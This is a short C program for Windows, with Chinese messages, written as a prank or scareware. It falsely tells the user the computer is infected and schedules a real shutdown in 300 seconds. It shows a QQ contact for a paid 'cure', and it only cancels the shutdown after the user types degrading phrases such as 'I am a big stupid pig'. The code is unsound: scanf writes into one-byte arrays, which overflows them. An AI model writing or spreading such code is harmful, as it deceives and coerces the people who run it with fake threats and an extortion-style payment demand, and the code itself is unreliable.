#define _CRT_SECURE_NO_WARNINGS 1
#include<stdio.h>
#include<string.h>
int main()
{
    char ant[] = { 0 };
    char ante[] = { 0 };
    int a = 0;
    for (; a < 5; a++)
        printf("\n");
    printf("你的电脑已被植入病毒，将在五分钟后永久关机····\n");
    system("shutdown -s -t 300");
    printf("请联系QQ:2083624672  付费解毒\n");
hui:
    printf("或者敲击键盘输入：我是猪    可免费解毒\n");
    scanf("%s", ant);
    if (strcmp(ant, "我是猪") == 0)
        printf("你被骗了，怎么可能免费解毒，不过看在我们两个这么好的关系，就不捉弄你了\n");
    else
        goto hui;
huiqu:
    printf("敲击键盘输入：我是一头大蠢猪   则取消关机\n");
    scanf("%s", ante);
    if (strcmp(ante, "我是一头大蠢猪") == 0)
        system("shutdown -a ");
    else
        goto huiqu;
    return 0;
}